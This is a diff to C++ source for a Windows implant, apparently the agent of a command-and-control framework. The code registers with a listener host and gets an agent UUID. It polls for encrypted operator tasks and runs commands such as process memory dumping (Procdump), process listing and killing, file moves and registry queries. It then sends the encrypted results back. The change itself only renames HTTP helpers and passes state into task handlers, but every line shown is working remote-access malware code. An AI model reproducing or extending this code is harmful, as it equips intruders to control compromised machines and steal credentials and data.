@@ -4,7 +4,7 @@ namespace Handler
 {
     VOID HTTPInit(State::PSTATE pState)
     {
-		System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
+		System::Http::WinHttpHandlers handlers = System::Http::RequestInit(
             pState->pProcs,
             pState->lpListenerHost,
             pState->nListenerPort
@@ -46,7 +46,7 @@ namespace Handler
         // Get architecture
         SYSTEM_INFO systemInfo;
         GetSystemInfo(&systemInfo);
-        wArch = System::Arch::GetName(systemInfo.wProcessorArchitecture);
+        wArch = System::Arch::ArchGetName(systemInfo.wProcessorArchitecture);
 
         // Get hostname and convert it to wstring
         WSADATA wsaData;
@@ -90,7 +90,7 @@ namespace Handler
     ) {
         std::string sInfoJson = Utils::Convert::UTF8Encode(wInfoJson);
 
-        System::Http::WinHttpResponse resp = System::Http::SendRequest(
+        System::Http::WinHttpResponse resp = System::Http::RequestSend(
             pState->pProcs,
             pState->hConnect,
             pState->lpListenerHost,
@@ -107,7 +107,7 @@ namespace Handler
         }
 
         // Receive the agent UUID.
-        pState->wUUID = System::Http::ReadResponseText(pState->pProcs, resp.hRequest);
+        pState->wUUID = System::Http::ResponseRead(pState->pProcs, resp.hRequest);
         
         return TRUE;
     }
@@ -116,7 +116,7 @@ namespace Handler
     {
         std::wstring wHeader = L"X-UUID: " + pState->wUUID + L"\r\n";
 
-        System::Http::WinHttpResponse resp = System::Http::SendRequest(
+        System::Http::WinHttpResponse resp = System::Http::RequestSend(
             pState->pProcs,
             pState->hConnect,
             pState->lpListenerHost,
@@ -134,7 +134,7 @@ namespace Handler
 
         pState->hRequest = resp.hRequest;
 
-        std::wstring wTaskEnc = System::Http::ReadResponseText(pState->pProcs, resp.hRequest);
+        std::wstring wTaskEnc = System::Http::ResponseRead(pState->pProcs, resp.hRequest);
 
         // We need to decrypt and encrypt to send back the task value for server-side decryption correctly.
         std::vector<BYTE> taskDec = Crypt::Decrypt(
@@ -243,6 +243,7 @@ namespace Handler
                 break;
             case TASK_MV:
                 wTaskResult = Task::Mv(
+                    pState,
                     Utils::Convert::UTF8Decode(args["src"]),
                     Utils::Convert::UTF8Decode(args["dest"])
                 );
@@ -254,25 +255,22 @@ namespace Handler
                 wTaskResult = Task::Procdump(pState, Utils::Convert::UTF8Decode(args["pid"]));
                 break;
             case TASK_PS_KILL:
-                wTaskResult = Task::PsKill(pState->pProcs, Utils::Convert::UTF8Decode(args["pid"]));
+                wTaskResult = Task::PsKill(pState, Utils::Convert::UTF8Decode(args["pid"]));
                 break;
             case TASK_PS_LS:
-                wTaskResult = Task::PsLs(pState->pProcs);
-                break;
-            case TASK_PWD:
-                wTaskResult = Task::Pwd();
-                break;
-            case TASK_REG_SUBKEYS:
-                wTaskResult = Task::RegSubKeys(
-                    Utils::Convert::UTF8Decode(args["rootkey"]),
-                    Utils::Convert::UTF8Decode(args["subkey"]),
-                    Utils::Convert::UTF8Decode(args["recursive"]) == L"true"
+                wTaskResult = Task::PsLs(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["filter"]),
+                    Utils::Convert::UTF8Decode(args["exclude"])
                 );
                 break;
-            case TASK_REG_VALUES:
-                wTaskResult = Task::RegValues(
-                    Utils::Convert::UTF8Decode(args["rootkey"]),
-                    Utils::Convert::UTF8Decode(args["subkey"]),
+            case TASK_PWD:
+                wTaskResult = Task::Pwd(pState);
+                break;
+            case TASK_REG_QUERY:
+                wTaskResult = Task::RegQuery(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["keyPath"]),
                     Utils::Convert::UTF8Decode(args["recursive"]) == L"true"
                 );
                 break;
@@ -382,7 +380,7 @@ namespace Handler
         );
         std::string sEnc = Utils::Convert::UTF8Encode(wEnc);
 
-        System::Http::WinHttpResponse resp = System::Http::SendRequest(
+        System::Http::WinHttpResponse resp = System::Http::RequestSend(
             pState->pProcs,
             pState->hConnect,
             pState->lpListenerHost,
@@ -567,6 +565,3 @@ namespace Handler
         }
     }
 }
-
-
-
